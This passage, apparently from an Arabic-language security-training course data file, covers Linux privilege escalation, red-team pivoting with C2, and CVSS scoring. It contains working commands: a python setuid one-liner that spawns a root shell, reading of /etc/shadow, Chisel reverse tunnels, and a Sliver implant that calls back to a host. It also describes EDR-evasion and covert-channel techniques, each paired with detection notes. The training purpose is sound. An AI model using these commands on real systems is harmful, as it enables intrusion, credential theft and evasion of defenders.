          { flag: 'getcap -r /', explanation: 'البحث الشامل عن جميع الملفات التي تمتلك قدرات لينكس مفعلة' },
          { flag: 'cap_setuid', explanation: 'القدرة التي تسمح للعملية بتعيين الـ User ID إلى root (UID=0)' }
        ],
        expectedOutput: `/usr/bin/python3.8 = cap_setuid+ep`,
        proTip: 'إذا رأيت python3 يملك cap_setuid+ep، نفذ فوراً: python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\' لتصبح root في لحظة واحدة.'
      }
    ],
    youtubeVideos: [
      {
        title: 'Linux Privilege Escalation for Beginners (Full Course)',
        channel: 'The Cyber Mentor',
        duration: '1 ساعة و 30 دقيقة',
        url: 'https://www.youtube.com/watch?v=7kJZXm_qLXA',
        keyTakeaway: 'شرح مفصل لجميع مسارات التصعيد في لينكس من Sudo و SUID حتى مهام Cron.'
      },
      {
        title: 'GTFOBins Explained - How to Turn Any Binary into Root',
        channel: 'John Hammond',
        duration: '20 دقيقة',
        url: 'https://www.youtube.com/watch?v=7uV8hG8f5fA',
        keyTakeaway: 'كيفية البحث في موقع GTFOBins واستغلال أوامر النظام العادية لاختراق الخادم.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Linux PrivEsc Lab', url: 'https://tryhackme.com/r/room/linprivesc', difficulty: 'Medium', whyMatters: 'المعمل التطبيقي القياسي لتعلم تصعيد الصلاحيات في لينكس.' },
      { name: 'Common Linux Privesc', url: 'https://tryhackme.com/r/room/commonlinuxprivesc', difficulty: 'Easy', whyMatters: 'تمارين موجهة على SUID و Sudo و Crontab.' }
    ],
    writeup: {
      title: 'تصعيد الصلاحيات في لينكس عبر قدرات النواة وتجاوز قيود Sudo (Linux PrivEsc Case Study)',
      scenario: 'تدقيق أمني على خادم Linux داخلي: بعد الحصول على شيل محدود للمستخدم student، تم فحص قدرات النظام (Linux Capabilities) واكتشاف باينري بايثون يمتلك قدرة cap_setuid+ep، واستغلالها لتعديل الـ UID إلى 0 والوصول إلى صلاحيات root الكاملة وقراءة ملف /etc/shadow.',
      steps: [
        {
          phase: 'Phase 01: Automated Capability & Sudo Rights Inspection',
          title: 'استكشاف الصلاحيات الممنوحة وقدرات النواة الخاصة بالملفات',
          action: 'تم تنفيذ أمر getcap -r / 2>/dev/null واكتشاف أن ملف /usr/bin/python3.8 يمتلك قدرة cap_setuid+ep، وهي قدرة نادرة تمنح البرنامج إمكانية استدعاء دالة setuid(0) دون الحاجة لـ SUID bit كامل على الملف.',
          detection: 'تسجل أنظمة مراقبة النواة (auditd) استعلامات الـ Extended File Attributes المتكررة كإشارة على مرحلة الاستكشاف الداخلي (Host Enumeration).',
          mitreId: 'T1548.001',
          link: 'https://man7.org/linux/man-pages/man7/capabilities.7.html',
          linkText: 'التوثيق الرسمي لمعمارية قدرات لينكس (Linux Capabilities Manual)'
        },
        {
          phase: 'Phase 02: Exploiting Python cap_setuid Capability',
          title: 'استغلال القدرة وتعديل معرّف المستخدم إلى root لحظياً',
          action: 'تم تشغيل سطر بايثون واحد: /usr/bin/python3.8 -c \'import os; os.setuid(0); os.system("/bin/bash")\'؛ فقامت النواة بالسماح للعملية بتعديل الـ UID إلى 0 (root) فوراً وفتح شيل تفاعلي بصلاحيات root المطلقة.',
          detection: 'ترصد حلول EDR على لينكس (مثل Falco Rule: "Set Setuid or Setgid bit") أي عملية بايثون تقوم بتعديل UID الخاص بها إلى 0 وتطلق تنبيهاً أمنياً مرتفعاً.',
          mitreId: 'T1548.001',
          link: 'https://gtfobins.github.io/gtfobins/python/#capabilities',
          linkText: 'توثيق تجاوز وصعود صلاحيات بايثون عبر Capabilities على GTFOBins'
        },
        {
          phase: 'Phase 03: Root Shadow File Access & Credential Dumping',
          title: 'الوصول لملفات النظام الحساسة وقراءة هاشات كلمات السر',
          action: 'بصلاحيات root، تم قراءة ملف /etc/shadow واستخراج هاشات الحسابات الإدارية والمستخدمين، وتوثيق السيطرة الكاملة على الخادم لتقرير التدقيق الأمني.',
          detection: 'تسجل سجلات auditd أحداث قراءة ملف /etc/shadow (Syscall openat مع المسار المحمي) وتصنفها كـ Credential Access Attempt.',
          mitreId: 'T1003.008',
          link: 'https://attack.mitre.org/techniques/T1003/008/',
          linkText: 'توثيق تقنيات استخراج كلمات السر من ملفات /etc/passwd و /etc/shadow على MITRE'
        },
        {
          phase: 'Phase 04: Capability Revocation & System Hardening',
          title: 'تجريد الملف من القدرات الخطيرة وتأمين الخادم',
          action: 'إزالة قدرة cap_setuid من بايثون عبر أمر: setcap -r /usr/bin/python3.8 وتثبيت سياسة SELinux / AppArmor لمنع العمليات التابعة للمستخدمين العاديين من استدعاء دوال تغيير الهوية.',
          detection: 'يتم التأكد من خلو مخرجات getcap -r / من أي ملفات غير موثوقة لحفظ استقرار وأمان النظام.',
          mitreId: 'T1548',
          link: 'https://wiki.archlinux.org/title/Capabilities',
          linkText: 'دليل تأمين وإدارة قدرات لينكس وفق أفضل الممارسات الأمنية'
        }
      ],
      lessonLearned: 'استخدام Linux Capabilities كبديل لـ SUID دون وعي بأثرها الأمني يفتح ثغرات تصعيد فورية وسريعة. يجب حصر القدرات على البرمجيات الموثوقة ومراجعتها دورياً عبر getcap -r /.'
    },
    secretTradecraft: [
      {
        title: 'استغلال مهام الجدولة الخفية وتتبع العمليات الزمنية (Cron Timing Inspection via pspy)',
        mitreId: 'T1053.003',
        category: 'Silent Reconnaissance without Root',
        explanation: 'كثير من مهام Cron Jobs لا تسجل في ملف /etc/crontab بل تعمل عبر Systemd Timers أو حسابات مخفية لا يملك المستخدم العادي صلاحية قراءتها. باستخدام أداة pspy المكتوبة بـ Go، يتم التجسس على استدعاءات النواة في /proc لمراقبة العمليات التي يتم تشغيلها كل دقيقة بدقة ومعرفة السكربتات التي تشغلها بصلاحية root لاستهدافها.',
        detection: 'ترصد برمجيات الحماية الفحص المستمر لمجلد /proc (Procfs Scanning Anomaly) القادم من مستخدمين عاديين.',
        link: 'https://github.com/DominicBreuker/pspy',
        linkText: 'مستودع أداة pspy الشهيرة لمراقبة عمليات وأوامر لينكس دون صلاحيات root'
      },
      {
        title: 'تصعيد الصلاحيات عبر قنوات D-Bus ومقابس Unix Sockets المفتوحة (D-Bus & Local Sockets PrivEsc)',
        mitreId: 'T1548',
        category: 'Inter-Process Communication Abuse',
        explanation: 'خدمات النظام تتواصل داخلياً عبر D-Bus أو مقابس Unix Sockets موجودة في /var/run/ أو /run/. إذا كانت أذونات المقبس تسمح بالقراءة والكتابة للمستخدم العادي، يمكن إرسال رسائل استدعاء أساليب (Method Calls) للخدمات ذات الصلاحيات العالية (مثل polkit أو systemd) لتنفيذ أوامر أو إعادة تشغيل خدمات بصلاحيات root.',
        detection: 'ترصد سجلات journalctl وأحداث auditd رسائل D-Bus غير القياسية المرسلة لخدمات النظام من جلسات المستخدمين العاديين.',
        link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus',
        linkText: 'دليل HackTricks لاستكشاف واستغلال قنوات D-Bus في تصعيد صلاحيات لينكس'
      },
      {
        title: 'الاستغلال الآمن لثغرات النواة وتفادي شاشة الموت (Kernel Exploitation Safety & Verification)',
        mitreId: 'T1068',
        category: 'Kernel Exploits Risk Management',
        explanation: 'تشغيل Kernel Exploits (مثل Dirty COW أو OverlayFS) مباشرة على سيرفر إنتاجي قد يتسبب في Kernel Panic فوري وإيقاف الخادم عن العمل تماماً. يقوم المحترفون بمطابقة إصدار النواة بدقة جراحية عبر uname -a مع كود الثغرة واختبارها أولاً في بيئة معملية مطابقة قبل تشغيلها على خادم العميل.',
        detection: 'تسجل سجلات dmesg وسجلات النواة أحداث Segfault و Kernel OOPS التي ترافق محاولات استغلال ثغرات الذاكرة في الـ Kernel Space.',
        link: 'https://attack.mitre.org/techniques/T1068/',
        linkText: 'توثيق تقنيات استغلال ثغرات النواة لتصعيد الصلاحيات في MITRE ATT&CK'
      }
    ],
    checklist: [
      { id: 'c15_1', text: 'إتقان استخدام أمر sudo -l وتطبيق حيل GTFOBins المقابلة.' },
      { id: 'c15_2', text: 'البحث عن ملفات SUID واستغلال الثغرات البرمجية المرتبطة بها.' },
      { id: 'c15_3', text: 'تشغيل وفهم تقارير أداة LinPEAS لاكتشاف الثغرات في ثوانٍ.' }
    ],
    officialResources: [
      { name: 'GTFOBins Official Repository', url: 'https://gtfobins.github.io', type: 'Cheatsheet' },
      { name: 'LinPEAS - Linux Privilege Escalation Awesome Script', url: 'https://github.com/peass-ng/PEASS-ng', type: 'Tools' }
    ]
  },

  {
    id: 16,
    zoneId: 'zone-redteam',
    titleAr: 'المرحلة 16: عمليات الريد تيم والتنقل الشبكي (C2 Operations & Pivoting)',
    titleEn: 'Stage 16: Red Team Operations, Pivoting, C2 Frameworks & AV Evasion',
    tag: 'Red Team Ops',
    difficulty: 'خبير — Expert',
    xpReward: 800,
    position: { x: 25, y: 0, z: 25 },
    brief: 'القمة الاحترافية لعمليات الريد تيم ومحاكاة الخصم: أطر القيادة والسيطرة الحديثة (C2 Frameworks مثل Sliver و Havoc)، تقنيات القفز والتنقل الشبكي (Pivoting & Chisel & SSH Tunneling)، وتجاوز برامج مكافحة الفيروسات (AV/EDR Evasion).',
    whyLearn: 'في الشبكات الحقيقية المعقدة للشركات والبنوك، لا تكون السيرفرات الحساسة متصلة بالإنترنت مباشرة، بل تقع في شبكات داخلية معزولة (VLANs / DMZ). بدون مهارات الـ Pivoting والتنقل، لن تستطيع الوصول إليها أبداً، وبدون فهم أطر الـ C2 ستكتشفك وتطردك برامج الـ EDR في دقائق.',
    professionalApplication: 'تنفيذ سيناريوهات محاكاة الهجمات المتقدمة (Adversary Emulation) للبنوك والمنشآت الحيوية، واختبار مدى قدرة مركز العمليات الأمنية (SOC) على رصد قنوات الاتصال المشفرة والخفية.',
    caseStudy: 'عمليات مجموعة APT29 (Cozy Bear) التي استخدمت خوادم C2 متعددة الطبقات مع تقنيات Domain Fronting لتمرير أوامر التحكم وسط ترافيك خدمات السحابة الموثوقة دون أن تلتقطها الجدران النارية.',
    commonMistakes: [
      'استخدام حمولات Metasploit الافتراضية غير المعدلة ضد بيئة تحوي Defender أو CrowdStrike مفعل، مما يؤدي لحرق العملية فوراً واكتشاف المهاجم.',
      'تجاهل ضبط نفق الـ Reverse SOCKS Proxy عند محاولة فحص شبكة داخلية خلف جهاز وسيط (Pivot Machine).'
    ],
    detailedGuide: `
### 1. تقنيات التنقل الشبكي وتمرير المنافذ (Pivoting & Port Forwarding)
عندما تخترق جهازاً يملك كارتين شبكة (كارت مكشوف للإنترنت 10.10.10.x وكارت متصل بشبكة داخلية معزولة 192.168.20.x):
* **SSH Local Port Forwarding:** \`ssh -L 8080:192.168.20.10:80 user@10.10.10.50\` (ربط بورت محلي على جهازك بالخدمة الداخلية المعزولة).
* **Chisel (Reverse SOCKS Proxy):** الأداة الأقوى لنقل الترافيك بالكامل عبر نفق HTTP مشفر، مما يتيح لك استخدام أدوات كالي (Nmap, Gobuster, SQLmap) ضد الشبكة الداخلية المعزولة عبر أداة \`proxychains\`.

### 2. أطر القيادة والسيطرة الحديثة (Modern C2 Frameworks)
بدلاً من الشيل الكلاسيكي غير المشفر، يعتمد الريد تيم على الـ C2:
* **Sliver C2:** إطار مفتوح المصدر قوي مكتوب بلغة Go من BishopFox، يدعم تشفير mTLS و WireGuard و DNS Beaconing.
* **Havoc C2:** إطار حديث يدعم إنشاء Beacons خفيفة جداً مكتوبة بلغة C/ASM لتفادي رصد الـ EDR.
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'إنشاء نفق SOCKS5 عكسي عبر Chisel للتنقل الشبكي (Pivoting - eJPT & OSCP)',
        desc: 'ربط شبكة كالي بالشبكة الداخلية المعزولة للضحية عبر نفق سريع مشفر عبر Chisel.',
        command: '# على ماكينة كالي:\nchisel server -p 8000 --reverse\n\n# على ماكينة الضحية المخترقة (Pivot Host):\n./chisel client 10.10.10.15:8000 R:socks',
        flags: [
          { flag: 'server -p 8000', explanation: 'تشغيل خادم Chisel في كالي للاستماع على المنفذ 8000' },
          { flag: '--reverse', explanation: 'تمكين الأنفاق العكسية لاستقبال الترافيك' },
          { flag: 'R:socks', explanation: 'فتح SOCKS5 Proxy محلي على منفذ 1080 في كالي لتمرير أدوات الفحص' }
        ],
        expectedOutput: `2026/09/29 18:40:12 server: Reverse tunnelling enabled
2026/09/29 18:40:15 server: session#1: tun: proxy#1: socks: 127.0.0.1:1080`,
        proTip: 'الآن اضبط ملف /etc/proxychains4.conf ليوجه الترافيك إلى socks5 127.0.0.1 1080، ويمكنك فحص أي IP في الشبكة الداخلية المعزولة بكتابة: proxychains nmap -sT 192.168.20.50!'
      },
      {
        step: 2,
        title: 'توليد مشغل أوامر C2 مشفر عبر Sliver C2',
        desc: 'إنشاء Payload متطور يدعم التشفير الكامل وقنوات اتصال mTLS الآمنة.',
        command: 'sliver > generate --mtls 10.10.10.15 --os linux --arch amd64 --save /tmp/implant.bin',
        flags: [
          { flag: '--mtls', explanation: 'بروتوكول الاتصال المتبادل المشفر mTLS لتفادي كشف الترافيك' },
          { flag: '--os linux', explanation: 'نظام تشغيل الهدف' },
          { flag: '--save', explanation: 'مسار حفظ الملف التنفيذي المولد' }
        ],
        expectedOutput: `[*] Generating new linux/amd64 implant binary
[*] Build completed in 4.2s
[*] Implant saved to /tmp/implant.bin`,
        proTip: 'أطر الـ C2 توفر لك خاصية الـ Beaconing (الاتصال المتقطع كل عدة دقائق مع Jitter عشوائي)، مما يجعل اكتشافها من قبل أنظمة الـ SOC ورصد الـ SIEM أمراً بالغ الصعوبة.'
      }
    ],
    youtubeVideos: [
      {
        title: 'Pivoting & Port Forwarding Explained with Chisel & Proxychains',
        channel: 'IppSec',
        duration: '38 دقيقة',
        url: 'https://www.youtube.com/watch?v=2mszCgE5aCo',
        keyTakeaway: 'الدليل العملي الأفضل على الإطلاق لفهم الأنفاق والتنقل بين شبكات الشركات المعزولة.'
      },
      {
        title: 'Sliver C2 Complete Installation & Red Team Tutorial',
        channel: 'John Hammond',
        duration: '44 دقيقة',
        url: 'https://www.youtube.com/watch?v=d_2eK8b8L0s',
        keyTakeaway: 'شرح إطار القيادة والسيطرة Sliver وإنشاء الحمولات والتحكم في الجلسات.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Post-Exploitation Basics', url: 'https://tryhackme.com/r/room/postexploitation', difficulty: 'Medium', whyMatters: 'أساسيات ما بعد الاختراق وتثبيت الصلاحيات وجمع البيانات.' },
      { name: 'Wreath Network (Real Pivoting Lab)', url: 'https://tryhackme.com/r/room/wreath', difficulty: 'Hard', whyMatters: 'شبكة واقعية كاملة لتعلم الـ Pivoting و C2 و AV Evasion.' }
    ],
    writeup: {
      title: 'عمليات الريد تيم والتنقل الشبكي متعدد القفزات عبر Chisel وزرع أطر C2 ببروتوكول mTLS',
      scenario: 'محاكاة هجوم متقدم (Adversary Emulation) لاختراق بنية بنكية تحتية: تم اختراق بوابة DMZ ذات كارتين شبكة (Dual-Homed)، وإنشاء نفق SOCKS5 عكسي مشفر للوصول إلى شبكة Active Directory المعزولة (192.168.100.0/24)، ونشر زرع C2 (Sliver implant) مشفر بـ mTLS مع تقنيات Jitter و Process Injection، وتفادي رصد مكافح الفيروسات و EDR.',
      steps: [
        {
          phase: 'Phase 01: Multi-Hop Pivoting with Chisel & Proxychains',
          title: 'إنشاء نفق SOCKS5 عكسي للعبور إلى الشبكات الداخلية المعزولة',
          action: 'تم إعداد خادم Chisel على كالي للاستماع على المنفذ 8000 بتشغيل chisel server -p 8000 --reverse، وتشغيل العميل على خادم الـ DMZ المخترق: ./chisel client 10.10.10.15:8000 R:1080:socks؛ مما فتح SOCKS5 Proxy محلي على منفذ 1080 في كالي لتوجيه أدوات الفحص عبر proxychains.',
          detection: 'ترصد الجدران النارية وأنظمة NIDS (مثل Snort / Suricata) اتصالات HTTP/Websocket طويلة الأمد وغير اعتيادية (Long-Lived WebSockets Tunnel) على منافذ غير مخصصة لتصفح الويب.',
          mitreId: 'T1090.002',
          link: 'https://github.com/jpillora/chisel',
          linkText: 'التوثيق الرسمي لأداة Chisel لتمرير الترافيك عبر أنفاق HTTP المشفرة'
        },
        {
          phase: 'Phase 02: Sliver C2 Implant Generation & Beacon Jittering',
          title: 'توليد مشغل C2 مشفر ببروتوكول mTLS وضبط فترات الخمول العشوائية',
          action: 'تم توليد زرع Sliver بلغة Go عبر الأمر: generate --mtls 10.10.10.15:8888 --os windows --arch amd64 --seconds 60 --jitter 30؛ وضبط التردد على نداء كل دقيقة مع تشتيت عشوائي (Jitter) بنسبة 30% لكسر الأنماط الرياضية الثابتة لمنع خوارزميات الـ SOC من تصنيف الترافيك كـ Beaconing.',
          detection: 'تسجل أنظمة مراقبة الشبكة (Zeek conn.log و Suricata) اتصالات دورية متبادلة مشفرة بـ TLS بشهادات ذاتية التوقيع (Self-Signed Certificates) أو شهادات لا تنتمي لـ Public Root CA معروف.',
          mitreId: 'T1071.001',
          link: 'https://sliver.sh/docs',
          linkText: 'دليل استخدام وتكوين إطار Sliver C2 وتشفير قنوات mTLS'
        },
        {
          phase: 'Phase 03: Process Injection & Shellcode Execution in Memory',
          title: 'حقن الشيلكود في العمليات المشروعة لتفادي الفحص على القرص',
          action: 'بدلاً من تشغيل ملف تنفيذي مشبوه على القرص، تم استخدام تقنية Process Injection لحقن شيلكود الـ C2 داخل عملية نظام شرعية مثل spoolsv.exe أو svchost.exe باستخدام تقنيات Early Bird APC Injection لتفادي فحص برامج مكافحة الفيروسات في الذاكرة.',
          detection: 'يرصد نظام Sysmon الحدث Event ID 8 (CreateRemoteThread) أو Event ID 10 (ProcessAccess) مع استدعاءات VirtualAllocEx بـ RWX Permissions متبوعة بـ WriteProcessMemory و QueueUserAPC.',
          mitreId: 'T1055.004',
          link: 'https://attack.mitre.org/techniques/T1055/004/',
          linkText: 'توثيق تقنيات حقن العمليات (Process Injection: Asynchronous Procedure Call) على MITRE'
        },
        {
          phase: 'Phase 04: Lateral Movement via WinRM & Internal Command Execution',
          title: 'الانتقال الأفقي للشبكة المعزولة والسيطرة على خادم النطاق الداخلي',
          action: 'عبر نفق Chisel SOCKS5 ومن خلال كالي، تم تشغيل أدوات الريد تيم (مثل evil-winrm و wmiexec) عبر proxychains لتنفيذ أوامر عن بُعد على خوادم الشبكة المعزولة 192.168.100.20 باستخدام الهاشات وكلمات السر المستخرجة.',
          detection: 'تسجل سجلات أمان ويندوز على الأجهزة المعزولة أحداث تسجيل الدخول عن بعد Event ID 4624 (Logon Type 3 - Network) و Sysmon Event ID 1 (إنشاء عمليات wsmprovhost.exe أو wmiprvse.exe).',
          mitreId: 'T1021.006',
          link: 'https://book.hacktricks.xyz/tunneling-and-port-forwarding',
          linkText: 'دليل HackTricks الشامل لتقنيات التنقل الشبكي وتمرير المنافذ (Pivoting & Tunneling)'
        }
      ],
      lessonLearned: 'عزل الشبكات خلف جدران نارية لا يحميها إذا كان هناك خادم وسيط يمكن السيطرة عليه وتحويله لنفق SOCKS5. الدفاع الحقيقي يتطلب تفتيش حركة مرور الأنفاق (TLS Inspection)، وفصل صلاحيات الإدارة بين مناطق الشبكة، ومراقبة سلوك حقن الذاكرة عبر حلول EDR الحديثة.'
    },
    secretTradecraft: [
      {
        title: 'استبدال SOCKS5 التقليدي بنفق Layer 3 حقيقي عبر Ligolo-ng',
        mitreId: 'T1090.001',
        category: 'Next-Gen Network Pivoting',
        explanation: 'أنفاق SOCKS5 التقليدية (مثل Chisel و SSH) تعاني من قيود شديدة عند استخدام proxychains: فهي لا تدعم بروتوكولات UDP و ICMP، ولا تتيح تنفيذ SYN Port Scans في Nmap وتكون بطيئة جداً. أداة Ligolo-ng الثورية تستخدم واجهة TUN حقيقية على كالي، مما ينشئ توجيهاً شبكياً كاملاً (Layer 3 Routing) وكأن كالي متصل مباشرة بسلك إيثرنت داخل شبكة الضحية المعزولة، مما يمكن من تشغيل Nmap و BloodHound بكفاءة وسرعة الشبكة المحلية.',
        detection: 'ترصد أنظمة مراقبة الشبكة ومضيفات لينكس إنشاء واجهات TUN/TAP افتراضية غير مصرح بها وتدفق حزم مجمعة بتغليف بروتوكول خاص (Custom Encapsulation).',
        link: 'https://github.com/nico-cha30/ligolo-ng',
        linkText: 'مستودع أداة Ligolo-ng الرسمية للـ Layer 3 Pivoting والأنفاق المتقدمة'
      },
      {
        title: 'تشفير الذاكرة أثناء وضع الخمول لتجاوز فحص EDR (Sleep Obfuscation & Ekko)',
        mitreId: 'T1027',
        category: 'In-Memory Defense Evasion',
        explanation: 'تقوم حلول EDR المتقدمة بمسح دوري للذاكرة العشوائية (Periodic Memory Scans) بحثاً عن بصمات الحمولات المزروعة (C2 Signatures) عندما تكون في وضع النوم (Sleeping). تقنيات Sleep Obfuscation (مثل Ekko و Foliage) تستخدم سلاسل ROP لتشفير شيلكود الـ C2 في الذاكرة (باستخدام RC4 أو XOR) وتغيير حماية صفحة الذاكرة من RWX/RX إلى PAGE_NOACCESS، وتفعيل مؤقت CreateTimerQueueTimer، وفك التشفير لحظة الاستيقاظ فقط لتنفيذ الأوامر ثم إعادة التشفير فوراً.',
        detection: 'تحليل سلوكيات EDR Hooking لكشف التكرار المريب لاستدعاءات VirtualProtect لتحويل صفحات الذاكرة بين NoAccess و ReadWriteExecute متزامنة مع مؤقتات مجهولة.',
        link: 'https://github.com/Cracked5pider/Ekko',
        linkText: 'مستودع تقنية Ekko لتشفير الذاكرة وتجاوز رصد الـ EDR أثناء الخمول'
      },
      {
        title: 'قنوات القيادة والسيطرة السرية عبر أنفاق DNS و ICMP (Covert C2 Tunnels)',
        mitreId: 'T1071.004',
        category: 'Covert Channel Communication',
        explanation: 'في البيئات شديدة التحصين (Air-Gapped or Restrictive Egress)، حيث تُحظر كافة اتصالات الويب وتخضع وكلاء HTTP للـ Deep Packet Inspection، يعتمد الريد تيم على بروتوكولات خفية: مثل توجيه أوامر الـ C2 عبر استعلامات DNS لأسماء نطاقات فرعية مشفرة (DNS TXT Queries) تمر عبر خادم DNS الداخلي للشركة دون اتصال مباشر بالإنترنت، أو عبر حقول البيانات في حزم ICMP Echo Request.',
        detection: 'تحليل سجلات الـ DNS عبر الـ SIEM لاكتشاف أسماء النطاقات ذات الإنتروبيا العالية (High Entropy Subdomains) ومعدل الاستعلامات المرتفع غير الطبيعي (DNS Tunneling Signatures).',
        link: 'https://attack.mitre.org/techniques/T1071/004/',
        linkText: 'توثيق تقنيات استخدام بروتوكول DNS كقناة للتحكم والسيطرة في MITRE ATT&CK'
      }
    ],
    checklist: [
      { id: 'c16_1', text: 'فهم ميكانيكية التنقل الشبكي (Pivoting) باستخدام Chisel و Proxychains.' },
      { id: 'c16_2', text: 'التمييز بين أطر الـ C2 الحديثة (Sliver / Havoc) وحمولات Metasploit التقليدية.' },
      { id: 'c16_3', text: 'استيعاب آليات تفادي الرصد وتشفير قنوات الاتصال والـ Beacons.' }
    ],
    officialResources: [
      { name: 'Sliver C2 Official Documentation (BishopFox)', url: 'https://sliver.sh/docs', type: 'Documentation' },
      { name: 'Chisel Fast TCP/UDP Tunnel over HTTP', url: 'https://github.com/jpillora/chisel', type: 'Tools' }
    ]
  },

  {
    id: 17,
    zoneId: 'zone-reporting',
    titleAr: 'المرحلة 17: تقييم وتصنيف الثغرات وفق معيار CVSS (Vulnerability Assessment & CVSS)',
    titleEn: 'Stage 17: Vulnerability Assessment, CVSS 3.1 & 4.0 Scoring Frameworks',
    tag: 'CVSS & Risk',
    difficulty: 'متقدم',
    xpReward: 400,
    position: { x: 30, y: 0, z: 25 },
    brief: 'تقييم خطورة الثغرات وتصنيفها بمعايير رياضية معتمدة دولياً: نظام تقييم الثغرات المشترك (CVSS v3.1 و CVSS v4.0)، حساب المقاييس الأساسية (Base Metrics: Attack Vector, Complexity, Privileges, User Interaction, Impact)، ونمذجة التهديدات (Threat Modeling).',
    whyLearn: 'اكتشاف الثغرة لا يكفي؛ بل يجب أن تقنع إدارة العميل بدرجة خطورتها الفعلية على أعمالهم. تصنيف الثغرة بشكل خاطئ (كتصنيف ثغرة خطيرة على أنها منخفضة أو العكس) يفقدك مصداقيتك المهنية ويعرض أنظمة العميل للخطر.',
    professionalApplication: 'يستخدمه مستشارو الأمن السيبراني في تصنيف مصفوفة المخاطر داخل التقارير التنفيذية ومساعدة مديري تقنية المعلومات على تحديد أولويات الترقيع وسد الثغرات (Remediation Prioritization).',
    caseStudy: 'ثغرة Log4Shell (CVE-2021-44228) التي حصلت على أعلى تقييم ممكن في معيار CVSS (10.0 Critical) نظراً لإمكانية استغلالها عن بعد عبر الشبكة دون مصادقة ودون أي تفاعل من المستخدم وبتأثير كارثي على السرية والسلامة والتوافر.',
    commonMistakes: [
      'الاعتماد فقط على المخرجات التلقائية لماسحات الثغرات (مثل Nessus أو OpenVAS) دون التحقق اليدوي، مما يؤدي لظهور نتائج إيجابية كاذبة (False Positives).',
      'تجاهل مقياس نطاق التأثير (Scope: Changed vs Unchanged) في معيار CVSS 3.1.'
    ],
    detailedGuide: `
### 1. المقاييس الأساسية لنظام CVSS 3.1 (Base Metrics Group)
* **متجه الهجوم (Attack Vector - AV):** Network (عبر الإنترنت), Adjacent (الشبكة المحلية), Local (وصول محلي للجهاز), Physical (وصول فيزيائي).
* **تعقيد الهجوم (Attack Complexity - AC):** Low (سهل ومباشر) أو High (يتطلب ظروفاً خاصة).
* **الصلاحيات المطلوبة (Privileges Required - PR):** None (مجهول), Low (مستخدم عادي), High (مدير).
* **تفاعل المستخدم (User Interaction - UI):** None (هجوم تلقائي), Required (يتطلب نقر الضحية على رابط مثل XSS).
* **نطاق التأثير (Scope - S):** Unchanged (يؤثر على نفس المكون فقط) أو Changed (يخترق المكون ويتعداه لمكونات أخرى مثل السحابة).
* **معايير التأثير (Impact: C / I / A):**
  * **Confidentiality:** High / Low / None
  * **Integrity:** High / Low / None
  * **Availability:** High / Low / None

### 2. الفروقات الجوهرية في معيار CVSS 4.0 الجديد
* دمج مقاييس جديدة لتقييم الأتمتة (Attack Requirements).
* تحسين تقييم أنظمة التحكم الصناعية (OT / ICS) وإنترنت الأشياء (IoT).
* إضافة مستويات دقيقة لتقييم سلامة الإنسان (Safety Impact).
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'حساب كود ودرجة CVSS 3.1 لثغرة SQLi مع استخراج الـ Vector String',
        desc: 'حساب الدرجة الرياضية القياسية لثغرة حقن قواعد بيانات واستخراج الـ Vector المعتمد دولياً.',
        command: 'echo "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H -> Base Score: 9.8 (CRITICAL)"',
        flags: [
          { flag: 'AV:N', explanation: 'قابلة للاستغلال عبر الإنترنت عن بعد (Network)' },
          { flag: 'PR:N', explanation: 'لا تتطلب أي حساب أو مصادقة مسبقة (Privileges None)' },
          { flag: 'C:H/I:H/A:H', explanation: 'تأثير مدمر كامل على سرية وسلامة وتوافر قاعدة البيانات' }
        ],
        expectedOutput: `CVSS v3.1 Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Severity: CRITICAL (Score 9.8 / 10.0)
NVD Standards Compliant: YES`,
        proTip: 'يمكنك استخدام حاسبة الـ CVSS المدمجة في الموقع التفاعلي لتوليد الـ Vector وحساب الدرجة تلقائياً بنقرة واحدة وتضمينها في تقريرك.'
      }
    ],
    youtubeVideos: [
      {
        title: 'CVSS v3.1 and v4.0 Scoring Explained in Plain English',
        channel: 'The Cyber Mentor',
        duration: '22 دقيقة',
        url: 'https://www.youtube.com/watch?v=3Kq1MIfTWCE',
        keyTakeaway: 'شرح ممتع لمعايير تقييم الثغرات وكيف تحسب درجات الخطورة في التقارير المهنية.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Vulnerability Management', url: 'https://tryhackme.com/r/room/vulnerabilitymanagement', difficulty: 'Easy', whyMatters: 'فهم دورة إدارة الثغرات وتصنيف المخاطر وتحديد أولويات المعالجة.' }
    ],
    writeup: {
      title: 'تقييم وتصنيف خطورة الثغرات وفق معايير CVSS v3.1 و CVSS v4.0 وصياغة سلاسل المتجهات (Vector Strings)',
      scenario: 'تقييم أمني شامل لمنصة مصرفية إلكترونية: اكتشاف ثغرة حقن أوامر نظام عن بُعد (Remote Code Execution - RCE) في بوابة التقارير المالية، وثغرة استبدال معرفات الكائنات المباشر (BOLA/IDOR) في واجهة برمجة التطبيقات (API). تم حساب وتوثيق درجات CVSS v3.1 و CVSS v4.0 المعتمدة، وبناء سلاسل الـ Vector Strings بدقة، وتحديد أولويات المعالجة الزمنية (SLA Remediation Roadmap) لإدارة المخاطر.',
      steps: [
        {
          phase: 'Phase 01: CVSS 3.1 Base Metrics Formulation for Remote Code Execution',
          title: 'الصياغة الرياضية للمقاييس الأساسية واستخراج الـ Vector String',
          action: 'تم تحليل ثغرة الـ RCE وفق مصفوفة FIRST: متجه الهجوم عبر الشبكة (AV:N)، تعقيد الهجوم منخفض (AC:L)، لا تتطلب صلاحيات مسبقة (PR:N)، لا تتطلب تفاعل المستخدم (UI:N)، ونطاق التأثير لم يتغير (S:U)، والتأثير كامل على السرية والسلامة والتوافر (C:H/I:H/A:H). نتج عن ذلك Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H بدرجة 9.8 Critical.',
          detection: 'مراجعة ومطابقة الحسابات الرياضية عبر حاسبة FIRST الرسمية لضمان عدم وجود تحيز أو أخطاء بشرية في تصنيف الثغرة.',
          mitreId: 'T1595',
          link: 'https://www.first.org/cvss/calculator/3.1',
          linkText: 'الحاسبة الرسمية لمنظمة FIRST لمعيار CVSS v3.1 المعتمد دولياً'
        },
        {
